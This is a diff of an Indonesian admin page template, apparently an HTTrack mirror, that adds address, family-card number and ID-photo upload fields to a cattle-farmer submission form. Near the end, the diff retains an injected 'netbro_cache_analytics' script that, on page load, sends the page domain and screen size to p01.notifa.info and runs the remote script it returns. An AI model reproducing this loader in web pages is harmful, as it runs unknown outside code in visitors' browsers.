@@ -151,90 +151,111 @@
                         </div>
                         <div class="col-md-6" >
                             <!-- <div class="block form-block mb-4" id="grad"> -->
-                            <div class="block form-block mb-4" id="grad_anamnisar">
-                                <div class="block-heading">
-                                    <h5>Tambah Data Pengajuan</h5>
-                                </div>
+                                <div class="block form-block mb-4" id="grad_anamnisar">
+                                    <div class="block-heading">
+                                        <h5>Tambah Data Pengajuan</h5>
+                                    </div>
 
-                                <form action="#">
+                                    <form action="#">
 
-                                    <div class="form-group">
-                                        <label>Tanggal Pengajuan</label>
-                                        <div class="input-group">
-                                            <span class="input-group-addon text-dark"><i class="ion-ios-calendar-outline"></i></span>
-                                            <input class="single-date-picker form-control  bg-white" type="text" placeholder="Select date of birth">
+                                        <div class="form-group">
+                                            <label>Tanggal Pengajuan</label>
+                                            <div class="input-group">
+                                                <span class="input-group-addon text-dark"><i class="ion-ios-calendar-outline"></i></span>
+                                                <input class="single-date-picker form-control  bg-white" type="text" placeholder="Select date of birth">
+                                            </div>
                                         </div>
-                                    </div>
-                                    <div class="form-group">
-                                        <label>Nama Peternak</label>
-                                        <input class="form-control  bg-white"  type="text" placeholder="Pak Budi">
-                                    </div>
-                                    <div class="form-group">
-                                        <label>Jumlah Sapi</label>
-                                        <input class="form-control  bg-white"  type="number" placeholder="20">
-                                    </div>
-                                   {{--  <div  style="text-align:center;">0deg</div><br> --}}
-                                                                    
-                                    <hr>
-                                    <a href="tambahPengajuan" class="btn btn-dark">Simpan</a>
-                                </form>
+                                        <div class="form-group">
+                                            <label>Nama Peternak</label>
+                                            <input class="form-control  bg-white"  type="text" placeholder="Pak Budi">
+                                        </div>
+                                        <div class="form-group">
+                                            <label>Alamat</label>
+                                            <input class="form-control  bg-white"  type="text" placeholder="">
+                                        </div>
+                                        <div class="form-group">
+                                            <label>No KK</label>
+                                            <input class="form-control  bg-white"  type="number" placeholder="">
+                                        </div>
+                                        <div class="form-group">
+                                            <label>Jumlah Sapi</label>
+                                            <input class="form-control  bg-white"  type="number" placeholder="20">
+                                        </div>
+                                        <div class="form-group">
+                                            <label>Upload Foto KTP</label>
+                                            <div class="block form-block">
+                                                <form action="http://wow.designgurus.in/sideNavigationLayout/blue/index.html" class="dropzone rounded" id="my-awesome-dropzone">
+                                                    <div class="dz-message">
+                                                        <div>
+                                                            <h4>Drop files here or click to upload.</h4>
+                                                            <div class="text-muted">(This is just a demo dropzone. Selected files are not actually uploaded)</div>
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                        {{--  <div  style="text-align:center;">0deg</div><br> --}}
+
+                                        <hr>
+                                        <a href="tambahPengajuan" class="btn btn-dark">Simpan</a>
+                                    </form>
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
 
-    </section>
-
+        </section>
 
 
 
 
-    <!--Jquery-->
-    <script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
-    <!--Bootstrap Js-->
-    <script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
-    <!--Modernizr Js-->
-    <script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>
 
-    <!--Morphin Search JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
-    <!--Morphin Search JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
+        <!--Jquery-->
+        <script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
+        <!--Bootstrap Js-->
+        <script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
+        <script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
+        <!--Modernizr Js-->
+        <script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>
 
-    <!--Chart js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>
+        <!--Morphin Search JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
+        <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
+        <!--Morphin Search JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
+        <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
 
-    <!--Sparkline Chart Js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
+        <!--Chart js-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>
 
-    <!--Custom Scroll-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
-    <!--Sortable Js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
-    <!--DropZone Js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
-    <!--Date Range JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
-    <!--CK Editor JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
-    <!--Data-Table JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
-    <!--Editable JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
-    <!--Full Calendar JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
+        <!--Sparkline Chart Js-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
+        <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
 
-    <!--- Main JS -->
-    <script src="assetAdmin/assets/js/main.js"></script>
+        <!--Custom Scroll-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
+        <!--Sortable Js-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
+        <!--DropZone Js-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
+        <!--Date Range JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
+        <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
+        <!--CK Editor JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
+        <!--Data-Table JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
+        <!--Editable JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
+        <!--Full Calendar JS-->
+        <script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
 
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+        <!--- Main JS -->
+        <script src="assetAdmin/assets/js/main.js"></script>
 
-    <!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
-    </html>
+        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+        <!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
+        </html>
